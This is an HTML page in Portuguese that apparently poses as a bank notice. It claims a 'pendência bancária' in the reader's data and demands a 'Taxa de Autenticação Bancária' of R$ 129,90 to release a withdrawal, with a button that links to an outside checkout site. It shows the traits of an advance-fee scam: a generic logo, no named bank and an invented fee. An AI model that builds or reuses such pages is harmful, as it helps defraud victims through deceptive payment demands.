<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Taxa de Autenticação Bancária</title>
  <style>
    body {
      background-color: #f4f4f4;
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
      color: #333;
    }

    .container {
      background-color: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      max-width: 420px;
      width: 100%;
      text-align: center;
    }

    h1 {
      color: #111;
      font-size: 22px;
    }

    p {
      margin: 20px 0;
      font-size: 16px;
      line-height: 1.5;
    }

    .payment-btn {
      display: inline-block;
      margin-top: 20px;
      padding: 14px 20px;
      background-color: #28a745;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      text-decoration: none;
      transition: background-color 0.3s ease;
    }

    .payment-btn:hover {
      background-color: #218838;
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Bank_font_awesome.svg" class="logo" alt="Banco">
    <h1>Taxa de Autenticação Bancária</h1>
    <p>
      Detectamos uma pendência bancária relacionada à verificação dos seus dados. Para continuar com a operação e liberar o saque, é necessário realizar o pagamento da <strong>Taxa de Autenticação Bancária</strong>.
    </p>
    <p>Valor da taxa: <strong>R$ 129,90</strong></p>
    <a href="https://pay.realizar-pagamento.com/checkout/16ed8d5b-468d-404d-a683-edb3a795b524" class="payment-btn">Realizar Pagamento</a>
  </div>
</body>
</html>
